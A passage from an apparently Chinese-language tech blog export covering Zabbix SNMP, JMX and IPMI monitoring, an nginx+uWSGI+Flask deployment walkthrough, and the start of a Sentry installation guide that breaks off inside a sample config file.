<p>​        选择“配置”-“主机”-“创建主机”，添加要被监控设备的主机信息：</p>
<p><img src="/articles/99653f69/14.png" alt="image.png"></p>
<p>​        添加模块：<img src="/articles/99653f69/15.png" alt="image.png"></p>
<p>​      添加宏： <img src="/articles/99653f69/16.png" alt="image.png"></p>
<h4 id="3、zabbix-SNMP监控windows系统"><a href="#3、zabbix-SNMP监控windows系统" class="headerlink" title="3、zabbix SNMP监控windows系统"></a>3、zabbix SNMP监控windows系统</h4><p>​        （1）windows系统启动SNMP功能：</p>
<p>​        选择“控制面板”-“程序”-“启用或关闭windows功能”，选择“简单网络管理协议（SNMP）”</p>
<p>​        <img src="/articles/99653f69/17.png" alt="image.png"></p>
<p>​        （2）右击“计算机”-“管理”-“服务”，选择“snmp server”服务器，右击“属性”：</p>
<p>​        <img src="/articles/99653f69/18.png" alt="image.png"></p>
<p>​        <img src="/articles/99653f69/19.png" alt="image.png"></p>
<p>（3）zabbix 服务端web界面，选择“配置”-“主机”，然后点击“创建主机”</p>
<p>​        <img src="/articles/99653f69/20.png" alt="image.png"></p>
<p>​        <img src="/articles/99653f69/21.png" alt="image.png"></p>
<p>​         大概需要等待五分钟左右，查看主机监控成功。</p>
<h4 id="4、zabbix-SNMP-监控网设备"><a href="#4、zabbix-SNMP-监控网设备" class="headerlink" title="4、zabbix SNMP 监控网设备"></a>4、zabbix SNMP 监控网设备</h4><p>​       “配置”-“主机”-“创建主机”，添写要监控的设备信息：</p>
<p>​     <img src="/articles/99653f69/22.png" alt="image.png">   </p>
<p>​     <img src="/articles/99653f69/23.png" alt="image.png"></p>
<h3 id="zabbix-JMX监控方式"><a href="#zabbix-JMX监控方式" class="headerlink" title="zabbix JMX监控方式"></a>zabbix JMX监控方式</h3><h4 id="1、zabbix-JMX-简介"><a href="#1、zabbix-JMX-简介" class="headerlink" title="1、zabbix JMX 简介"></a>1、zabbix JMX 简介</h4><p>​        在企业中，很多程序是基于Java来编写的，java程序运行在JVM之上，而JVM自己就可以监听在某个套接字上，将自己内部的状态信息输出出去，所以监控服务器只需要直接连接JVM的套接字就可以获取到Java进程的相关信息，不需要通过Agent、SNMP；可是zabbix是没办法自己连接JVM套接字的，也就是说，zabbix自身是不能够作为客户端来链接该套接字的。所以，就需要额外安装一个服务来连接JVM套接字的。这个服务就是zabbix-java-gateway.x86_64(Java网关）；可以通过该网关来监听多个JVM；zabbix-agent-gateway可以是一个单独的主机，可以和zabbix server安装到一台主机上；</p>
<h4 id="2、zabbix-server-安装java-gateway"><a href="#2、zabbix-server-安装java-gateway" class="headerlink" title="2、zabbix server 安装java gateway"></a>2、zabbix server 安装java gateway</h4><p>​        zabbix提供了一个java gateway的应用去监控jmx（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y java java-devel zabbix-java-gateway</span><br></pre></td></tr></table></figure>

<h4 id="3、添加java环境"><a href="#3、添加java环境" class="headerlink" title="3、添加java环境"></a>3、添加java环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">​ JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64</span><br><span class="line">​ PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">​ CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">​ export JAVA_HOME</span><br><span class="line">​ export PATH</span><br><span class="line">​ export CLASSPATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">加载环境：</span></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h4 id="4、修改java-gateway配置文件"><a href="#4、修改java-gateway配置文件" class="headerlink" title="4、修改java-gateway配置文件"></a>4、修改java-gateway配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep ^[a-Z]  /etc/zabbix/zabbix_java_gateway.conf</span><br><span class="line">cd /etc/zabbix</span><br><span class="line">vim zabbix_java_gateway.conf  修改以下信息：</span><br><span class="line"></span><br><span class="line">​ LISTEN_IP="0.0.0.0"</span><br><span class="line">​ LISTEN_PORT=10052</span><br><span class="line">​ PID_FILE="/var/run/zabbix/zabbix_java.pid"</span><br><span class="line">​ START_POLLERS=5</span><br><span class="line">​ TIMEOUT=3</span><br></pre></td></tr></table></figure>

<h4 id="5、重启java-gateway服务"><a href="#5、重启java-gateway服务" class="headerlink" title="5、重启java-gateway服务"></a>5、重启java-gateway服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart zabbix-java-gateway</span><br></pre></td></tr></table></figure>

<h4 id="6、修改zabbix-server配置文件"><a href="#6、修改zabbix-server配置文件" class="headerlink" title="6、修改zabbix_server配置文件"></a>6、修改zabbix_server配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name zabbix_java_gateway</span><br><span class="line">vim /usr/sbin/zabbix_java_gateway    修改以下配置信息</span><br><span class="line"></span><br><span class="line">​ JavaGateway=192.168.40.131&lt;br&gt;</span><br><span class="line">​ JavaGatewayPort=10052&lt;br&gt;</span><br><span class="line">​ StartJavaPollers=5</span><br></pre></td></tr></table></figure>

<h4 id="7、重启zabbix-server服务"><a href="#7、重启zabbix-server服务" class="headerlink" title="7、重启zabbix_server服务"></a>7、重启zabbix_server服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart zabbix-server</span><br></pre></td></tr></table></figure>

<h4 id="8、客户端配置"><a href="#8、客户端配置" class="headerlink" title="8、客户端配置"></a>8、客户端配置</h4><p>​        在Tomcat下的/bin/catalina.sh文件中添加以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CATALINA_OPTS="$CATALINA_OPTS -Djavax.management.builder.initial= -Dcom.sun.management.jmxremote=true -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=192.168.40.131"</span><br></pre></td></tr></table></figure>

<p>​        重启Tomcat进程：</p>
<p>​        <img src="/articles/99653f69/24.png" alt="image.png"></p>
<h4 id="9、zabbix中添加监控"><a href="#9、zabbix中添加监控" class="headerlink" title="9、zabbix中添加监控"></a>9、zabbix中添加监控</h4><p>​        选择配置：主机-模板-选择-模板-：<img src="/articles/99653f69/25.png" alt="image.png"></p>
<h3 id="zabbix-IPMI监控方式"><a href="#zabbix-IPMI监控方式" class="headerlink" title="zabbix IPMI监控方式"></a>zabbix IPMI监控方式</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>​        IPMI（Intelligent PlatformManagement Interface）既智能平台管理接口是使硬件管理具备“智能化”的新一代通用接口标准。用户可以利用IPMI监视服务器的物理特性，如温度、电压、电扇工作状态、电源供应以及机箱入侵等。Ipmi最大的优势在于它是独立于 CPU BIOS 和OS的，所以用户无论在开机还是关机的状态下，只要接通电源就可以实现对服务器的监控。Ipmi是一种规范的标准，其中最重要的物理部件就是BMC（Baseboard Management Controller），一种嵌入式管理微控制器，它相当于整个平台管理的“大脑”，通过它 ipmi 可以监控各个传感器的数据并记录各种事件的日志。</p>
<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>​        使用 ipmi 的先决条件，想要实现对服务器的 ipmi 管理，必须在硬件、OS、管理工具等几个方面都满足：</p>
<p>​        a.服务器硬件本身提供对 ipmi 的支持目前惠普、戴尔和 NEC 等大多数厂商的服务器都支持IPMI 1.5，但并不是所有服务器都支持，所以应该先通过产品手册或在 BIOS 中确定服务器是否支持 ipmi，也就是说服务器在主板上要具有 BMC 等嵌入式的管理微控制器。</p>
<p>​         b.操作系统提供相应的 ipmi 驱动通过操作系统监控服务器自身的 ipmi 信息时需要系统内核提供相应的支持，linux 系统通过内核对OpenIPMI（ipmi 驱动）的支持来提供对 ipmi 的系统接口。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>日常监控中使用IPMI的方式不多，在此不举例说明了。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx+uwsgi+flask搭建web服务</title>
    <url>/articles/e67f5ae2.html</url>
    <content><![CDATA[<h1 id="1，目的"><a href="#1，目的" class="headerlink" title="1，目的"></a>1，目的</h1><p>在生产环境下，可以通过Nginx+uwsgi+Flask部署Web服务，从而达到高并发高稳定性的要求。<br> 如果要部署多个APP，可以采用单个Nginx，多个uwsgi+Flask的方式来实现，如下图所示。</p>
<p><img src="/articles/e67f5ae2/1.png" alt="img"></p>
<a id="more"></a>

<h1 id="2，安装过程"><a href="#2，安装过程" class="headerlink" title="2，安装过程"></a>2，安装过程</h1><h2 id="2-1，升级软件包"><a href="#2-1，升级软件包" class="headerlink" title="2.1，升级软件包"></a>2.1，升级软件包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h2 id="2-2，安装virtualenv和python环境"><a href="#2-2，安装virtualenv和python环境" class="headerlink" title="2.2，安装virtualenv和python环境"></a>2.2，安装virtualenv和python环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential python-dev python-pip </span><br><span class="line">sudo pip install virtualenv</span><br></pre></td></tr></table></figure>

<h2 id="2-3，在virtualenv中部署flask-app，并测试"><a href="#2-3，在virtualenv中部署flask-app，并测试" class="headerlink" title="2.3，在virtualenv中部署flask app，并测试"></a>2.3，在virtualenv中部署flask app，并测试</h2><ul>
<li>创建存放网站的目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir mysite</span><br></pre></td></tr></table></figure>

<ul>
<li>配置virtualenv和安装flask</li>
</ul>
<p>进入mysite目录，然后创建虚拟环境.env，激活虚拟环境，然后安装flask</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd mysite </span><br><span class="line">virtualenv .env # 创建Python虚拟环境 </span><br><span class="line">source .env/bin/activate # 进入Python虚拟环境，退出命令是deactivate </span><br><span class="line">pip install flask # 在虚拟环境下安装flask</span><br></pre></td></tr></table></figure>

<ul>
<li>在mysite目录下创建hello.py</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/app1/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/app1/flask/&quot;)</span><br><span class="line">def hello_flask():</span><br><span class="line">    return &quot;Hello World! Hello Flask!&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;, port=8080)</span><br></pre></td></tr></table></figure>

<p>需要注意的是，app.run()只是开发时测试使用，故需要放置在<code>if __name__ == &quot;__main__&quot;</code>下，这样uwsgi才不会执行app.run()方法。而host需要设置为0.0.0.0，表示让flask监听机器的所有ip地址的8080端口。</p>
<ul>
<li>启动测试<br> 执行以下命令，可以启动Flask。通过浏览器访问192.168.1.32:8080/app1/，如果返回“Hello World!”，则证明启动OK。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python hello.py</span><br></pre></td></tr></table></figure>

<h2 id="2-4，在virtualenv中部署uwsgi，并测试"><a href="#2-4，在virtualenv中部署uwsgi，并测试" class="headerlink" title="2.4，在virtualenv中部署uwsgi，并测试"></a>2.4，在virtualenv中部署uwsgi，并测试</h2><ul>
<li>进入到Python虚拟环境，并安装uwsgi</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source .env/bin/activate # 进入Python虚拟环境，退出命令是deactivate </span><br><span class="line">pip install uwsgi # 在虚拟环境下安装uwsgi</span><br><span class="line"></span><br><span class="line">#uwsgi的启动可以把参数加载命令行中，也可以是配置文件 .ini, .xml, .yaml 配置文件中，个人用的比较多得是 .ini 文件。</span><br><span class="line"></span><br><span class="line">#通过uwsgi --help可以查看得到：</span><br><span class="line">-x|--xmlconfig                         load config from xml file</span><br><span class="line">-x|--xml                               load config from xml file</span><br><span class="line">--ini                                  load config from ini file</span><br><span class="line">-y|--yaml                              load config from yaml file</span><br><span class="line">-y|--yml                               load config from yaml file</span><br></pre></td></tr></table></figure>

<ul>
<li>创建uwsgi目录，做好目录规划如下 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.env) kevin@orange:~/web/flask/mysite$ tree .</span><br><span class="line">.</span><br><span class="line">├── hello.py</span><br><span class="line">├── hello.pyc</span><br><span class="line">├── uwsgi</span><br><span class="line">│   ├── uwsgi.log</span><br><span class="line">│   ├── uwsgi.pid</span><br><span class="line">│   ├── uwsgi.sock</span><br><span class="line">│   └── uwsgi.status</span><br><span class="line">└── uwsgi.ini</span><br></pre></td></tr></table></figure>

<ul>
<li>修改uwsgi配置文件 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.env) kevin@orange:~/web/flask/mysite$ vi uwsgi.ini </span><br><span class="line">[uwsgi]</span><br><span class="line">chdir=/home/kevin/web/flask/mysite/</span><br><span class="line">home=/home/kevin/web/flask/mysite/.env</span><br><span class="line">module=hello</span><br><span class="line">callable=app</span><br><span class="line">master=true</span><br><span class="line">processes=2</span><br><span class="line">chmod-socket=666</span><br><span class="line">logfile-chmod=644</span><br><span class="line">uid=kevin_web</span><br><span class="line">gid=kevin_web</span><br><span class="line">procname-prefix-spaced=mysite</span><br><span class="line">py-autoreload=1</span><br><span class="line">#http=0.0.0.0:8080</span><br><span class="line"></span><br><span class="line">vacuum=true</span><br><span class="line">socket=%(chdir)/uwsgi/uwsgi.sock</span><br><span class="line">stats=%(chdir)/uwsgi/uwsgi.status</span><br><span class="line">pidfile=%(chdir)/uwsgi/uwsgi.pid</span><br><span class="line">daemonize=%(chdir)/uwsgi/uwsgi.log</span><br></pre></td></tr></table></figure>

<p>配置参数的含义，可参考<a href="https://www.jianshu.com/p/c3b13b5ad3d7" target="_blank" rel="noopener">http://www.jianshu.com/p/c3b13b5ad3d7</a></p>
<p>常用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uwsgi --ini uwsgi.ini             # 启动</span><br><span class="line">uwsgi --reload uwsgi.pid          # 重启</span><br><span class="line">uwsgi --stop uwsgi.pid            # 关闭</span><br></pre></td></tr></table></figure>

<ul>
<li>启动uwsgi（在虚拟环境下），并测试</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(.env) kevin@orange:~/web/flask/mysite$ uwsgi --ini uwsgi.ini</span><br><span class="line">[uWSGI] getting INI configuration from uwsgi.ini</span><br><span class="line">(.env) kevin@orange:~/web/flask/mysite$ ps -ef | grep mysite</span><br><span class="line">zhangsh+  2270     1  0 16:15 ?        00:00:00 mysite uWSGI master</span><br><span class="line">zhangsh+  2273  2270  0 16:15 ?        00:00:00 mysite uWSGI worker 1</span><br><span class="line">zhangsh+  2274  2270  0 16:15 ?        00:00:00 mysite uWSGI worker 2</span><br><span class="line">zhangsh+  2278  2171  0 16:15 pts/1    00:00:00 grep --color=auto mysite</span><br></pre></td></tr></table></figure>

<h2 id="2-5，安装nginx，并配置测试"><a href="#2-5，安装nginx，并配置测试" class="headerlink" title="2.5，安装nginx，并配置测试"></a>2.5，安装nginx，并配置测试</h2><ul>
<li>安装nginx（不在python虚拟环境下）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>编辑配置文件：/etc/nginx/conf.d/flask.conf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 81;</span><br><span class="line">    server_name www.mysite.com;</span><br><span class="line">    charset utf-8;</span><br><span class="line"></span><br><span class="line">    client_max_body_size 5M;</span><br><span class="line"></span><br><span class="line">    location /app1/ &#123;</span><br><span class="line">         include uwsgi_params;</span><br><span class="line">         uwsgi_pass unix:/home/kevin/web/flask/mysite/uwsgi/uwsgi.sock;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     location /static &#123;</span><br><span class="line">         alias /home/kevin/web/flask/mysite/static;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>nginx启动测试</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kevin@orange:~/web/flask/mysite$ sudo service nginx start</span><br><span class="line">kevin@orange:~/web/flask/mysite$ ps -ef | grep nginx</span><br><span class="line">root      2324     1  0 16:19 ?        00:00:00 nginx: master process /usr/sbin/nginx</span><br><span class="line">www-data  2325  2324  0 16:19 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data  2326  2324  0 16:19 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data  2327  2324  0 16:19 ?        00:00:00 nginx: worker process</span><br><span class="line">www-data  2328  2324  0 16:19 ?        00:00:00 nginx: worker process</span><br><span class="line">zhangsh+  2330  2171  0 16:20 pts/1    00:00:00 grep --color=auto nginx</span><br></pre></td></tr></table></figure>

<h2 id="2-6，服务测试"><a href="#2-6，服务测试" class="headerlink" title="2.6，服务测试"></a>2.6，服务测试</h2><ul>
<li>Http访问测试，一切OK</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kevin@Blue:~$ curl http://192.168.1.32:81/app1/flask/</span><br><span class="line">Hello World! Hello Flask!</span><br><span class="line">kevin@Blue:~$ curl http://192.168.1.32:81/app1/</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器访问测试，一切OK</li>
</ul>
<h1 id="3，服务监控"><a href="#3，服务监控" class="headerlink" title="3，服务监控"></a>3，服务监控</h1><ul>
<li><p>读取uwsgi实时状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uwsgi --connect-and-read uwsgi/uwsgi.status</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>读取的结果是个json串，包括每个总的状态，每个work是状态，响应时间等，非常全面，也有一些开源的监控可以使用</p>
<ul>
<li><p>实时动态查看状态 - uwsgitop</p>
<p>这里有个uwsgi官方制作的实用工具 uwsgitop, 下面看下效果。</p>
</li>
</ul>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pip install uwsgitop</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> uwsgitop uwsgi/uwsgi.status</span></span><br><span class="line">uwsgi-2.0.9 - Mon Sep 14 11:20:44 2015 - req: 0 - RPS: 0 - lq: 0 - tx: 0</span><br><span class="line">node: lzz-rmbp - cwd: /Users/liuzhizhi/erya/portal - uid: 501 - gid: 20 - masterpid: 12748</span><br><span class="line"> WID    %       PID     REQ     RPS     EXC     SIG     STATUS  AVG     RSS     VSZ     TX      RunT</span><br><span class="line"> 1      0.0     12749   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 2      0.0     12750   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 3      0.0     12751   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 4      0.0     12752   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 5      0.0     12753   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 6      0.0     12754   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 7      0.0     12755   0       0       0       0       idle    0ms     0       0       0       0</span><br><span class="line"> 8      0.0     12756   0       0       0       0       idle    0ms     0       0       0       0</span><br></pre></td></tr></table></figure>



<h1 id="4，参考资料"><a href="#4，参考资料" class="headerlink" title="4，参考资料"></a>4，参考资料</h1><ul>
<li>如何理解Nginx, WSGI, Flask之间的关系<br><a href="https://link.jianshu.com?t=http://blog.csdn.net/lihao21/article/details/52304119" target="_blank" rel="noopener">http://blog.csdn.net/lihao21/article/details/52304119</a></li>
<li>uWSGI的安装与配置<br><a href="https://link.jianshu.com?t=http://blog.csdn.net/chenggong2dm/article/details/43937433" target="_blank" rel="noopener">http://blog.csdn.net/chenggong2dm/article/details/43937433</a></li>
<li>uWSGI实战之操作经验<br><a href="https://link.jianshu.com?t=http://blog.csdn.net/orangleliu/article/details/48437319" target="_blank" rel="noopener">http://blog.csdn.net/orangleliu/article/details/48437319</a></li>
<li>nginx配置参考<br><a href="https://link.jianshu.com?t=http://wiki.nginx.org/HttpUwsgiModule#uwsgi_param" target="_blank" rel="noopener">http://wiki.nginx.org/HttpUwsgiModule#uwsgi_param</a></li>
<li>uwsgi安装参考<br><a href="https://link.jianshu.com?t=http://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html" target="_blank" rel="noopener">http://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html</a></li>
<li>uwsgi配置参考<br><a href="https://link.jianshu.com?t=http://uwsgi-docs.readthedocs.io/en/latest/Options.html#vacuum" target="_blank" rel="noopener">http://uwsgi-docs.readthedocs.io/en/latest/Options.html#vacuum</a></li>
<li>Nginx+uWSGI<br><a href="https://link.jianshu.com?t=https://my.oschina.net/guol/blog/121418" target="_blank" rel="noopener">https://my.oschina.net/guol/blog/121418</a></li>
</ul>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>Uwsgi</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>业务监控工具Sentry的搭建与使用</title>
    <url>/articles/9bd04711.html</url>
    <content><![CDATA[<h3 id="官方网址"><a href="#官方网址" class="headerlink" title="官方网址"></a>官方网址</h3><p>参考<a href="https://sentry.io/welcome/" target="_blank" rel="noopener">Django Sentry 官网</a></p>
<h3 id="Sentry-简介"><a href="#Sentry-简介" class="headerlink" title="Sentry 简介"></a>Sentry 简介</h3><p>Sentry 是一个开源的实时错误报告工具，支持 web 前后端、移动应用以及游戏，支持 Python、OC、Java、Go、Node、Django、RoR 等主流编程语言和框架 ，还提供了 GitHub、Slack、Trello 等常见开发工具的集成。<br>Sentry 服务支持多用户、多团队、多应用管理，每个应用都对应一个 PROJECT_ID，以及用于身份认证的 PUBLIC_KEY 和 SECRET_KEY。由此组成一个这样的 DSN：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;PROTOCOL&#125;://&#123;PUBLIC_KEY&#125;:&#123;SECRET_KEY&#125;@&#123;HOST&#125;/&#123;PATH&#125;&#123;PROJECT_ID&#125;</span><br></pre></td></tr></table></figure>

<p>PROTOCOL 通常会是 http 或者 https，HOST 为 Sentry 服务的主机名和端口，PATH 通常为空。</p>
<a id="more"></a>

<h3 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h3><ol>
<li>Redis 搭建 / RabbitMQ 的搭建</li>
<li>MySQL / PostgreSQL</li>
<li>Python 虚拟环境</li>
</ol>
<h3 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h3><ul>
<li>Redis 的安装<br>参考文档：<br><a href="https://linux.cn/article-6719-1.html" target="_blank" rel="noopener">https://linux.cn/article-6719-1.html</a><br><a href="http://www.jianshu.com/p/aec247ffbe51" target="_blank" rel="noopener">http://www.jianshu.com/p/aec247ffbe51</a></li>
<li>MySQL 的安装<ul>
<li>略</li>
</ul>
</li>
<li>Python 虚拟环境的安装<br>因为 Sentry 依赖的 Python 库比较多，为了避免对系统环境的污染，与现有的Python有冲突，建议还是将 Sentry 安装在虚拟环境中。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. Python 库文件： python-setuptools, python-dev, build-essential, python-pip</span><br><span class="line"></span><br><span class="line">B. 安装虚拟环境： pip install virtualenv</span><br><span class="line">     安装完成后，可以直接 virtualenv xxx 即可在当前目录下生成一个虚拟环境xxx目录，进入到目录中，source bin/activate 即可激活当前虚拟环境。</span><br><span class="line"></span><br><span class="line">C. 选择安装 virtualenvwrapper： pip install virtualenvwrapper</span><br><span class="line">     安装完成后，建立个虚拟环境安装存储的目录，建议是 $HOME/.virtualenv 目录，配置下 .bashrc 文件，文件末尾添加：</span><br><span class="line">     export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">     source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line"></span><br><span class="line">source .bashrc后，运行 mkvirtualenv xxx 即可建立虚拟环境。退出运行 deactivate。这样，就不需要再进入到虚拟环境目录运行 source xxx/activate，直接在终端输入 workon xxx 即可。</span><br></pre></td></tr></table></figure>

<ul>
<li>Sentry<br>在虚拟环境下，直接运行 <code>pip install sentry</code> 即可。</li>
</ul>
<p>这样，安装基本上就结束了。接下来需要配置下 sentry。</p>
<h3 id="配置-Sentry"><a href="#配置-Sentry" class="headerlink" title="配置 Sentry"></a>配置 Sentry</h3><p>运行 <code>sentry init</code>, 会在 $HOME 下生成 <code>.sentry</code> 目录。进入 .sentry 后，需要修改数据库配置(当然，你也可以不改，直接使用 PostgreSQL)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, # 这里换成了 MySQL，默认是 pq</span><br><span class="line">        &apos;NAME&apos;: &apos;xxx&apos;,</span><br><span class="line">        &apos;USER&apos;: &apos;xxx&apos;,</span><br><span class="line">        &apos;PASSWORD&apos;: &apos;xxx&apos;,</span><br><span class="line">        &apos;HOST&apos;: &apos;xxx&apos;,</span><br><span class="line">        &apos;PORT&apos;: &apos;xxx&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>端口和队列等可以自行指定。这里，我指定的是15000。下面是一个配置参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This file is just Python, with a touch of Django which means</span><br><span class="line"># you can inherit and tweak settings to your hearts content.</span><br><span class="line">from sentry.conf.server import *</span><br><span class="line"></span><br><span class="line">import os.path</span><br><span class="line"></span><br><span class="line">CONF_ROOT = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</span><br><span class="line">        &apos;NAME&apos;: &apos;django_sentry&apos;,</span><br><span class="line">        &apos;USER&apos;: &apos;root&apos;,</span><br><span class="line">        &apos;PASSWORD&apos;: &apos;password&apos;,</span><br><span class="line">        &apos;HOST&apos;: &apos;localhost&apos;,</span><br><span class="line">        &apos;PORT&apos;: &apos;3306&apos;,</span><br><span class="line">        &apos;AUTOCOMMIT&apos;: True,</span><br><span class="line">        &apos;ATOMIC_REQUESTS&apos;: False,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># You should not change this setting after your database has been created</span><br><span class="line"># unless you have altered all schemas first</span><br><span class="line">SENTRY_USE_BIG_INTS = True</span><br><span class="line"></span><br><span class="line"># If you&apos;re expecting any kind of real traffic on Sentry, we highly recommend</span><br><span class="line"># configuring the CACHES and Redis settings</span><br><span class="line"></span><br><span class="line">###########</span><br><span class="line"># General #</span><br><span class="line">###########</span><br><span class="line"></span><br><span class="line"># Instruct Sentry that this install intends to be run by a single organization</span><br><span class="line"># and thus various UI optimizations should be enabled.</span><br><span class="line">SENTRY_SINGLE_ORGANIZATION = True</span><br><span class="line">DEBUG = False</span><br><span class="line"></span><br><span class="line">#########</span><br><span class="line"># Cache #</span><br><span class="line">#########</span><br><span class="line"></span><br><span class="line"># Sentry currently utilizes two separate mechanisms. While CACHES is not a</span><br><span class="line"># requirement, it will optimize several high throughput patterns.</span><br><span class="line"></span><br><span class="line"># If you wish to use memcached, install the dependencies and adjust the config</span><br><span class="line"># as shown:</span><br><span class="line">#</span><br><span class="line">#   pip install python-memcached</span><br><span class="line">#</span><br><span class="line"># CACHES = &#123;</span><br><span class="line">#     &apos;default&apos;: &#123;</span><br><span class="line">#         &apos;BACKEND&apos;: &apos;django.core.cache.backends.memcached.MemcachedCache&apos;,</span><br><span class="line">#         &apos;LOCATION&apos;: [&apos;127.0.0.1:11211&apos;],</span><br><span class="line">#     &#125;</span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line"># A primary cache is required for things such as processing events</span><br><span class="line">SENTRY_CACHE = &apos;sentry.cache.redis.RedisCache&apos;</span><br><span class="line"></span><br><span class="line">#########</span><br><span class="line"># Queue #</span><br><span class="line">#########</span><br><span class="line"></span><br><span class="line"># See https://docs.sentry.io/on-premise/server/queue/ for more</span><br><span class="line"># information on configuring your queue broker and workers. Sentry relies</span><br><span class="line"># on a Python framework called Celery to manage queues.</span><br><span class="line">CELERY_ALWAYS_EAGER = False</span><br><span class="line">BROKER_URL = &apos;redis://127.0.0.1:6379&apos;</span><br><span class="line"></span><br><span class="line">###############</span><br><span class="line"># Rate Limits #</span><br><span class="line">###############</span><br><span class="line"></span><br><span class="line"># Rate limits apply to notification handlers and are enforced per-project</span><br><span class="line"># automatically.</span><br><span class="line"></span><br><span class="line">SENTRY_RATELIMITER = &apos;sentry.ratelimits.redis.RedisRateLimiter&apos;</span><br><span class="line"></span><br><span class="line">##################</span><br><span class="line"># Update Buffers #</span><br><span class="line">##################</span><br><span 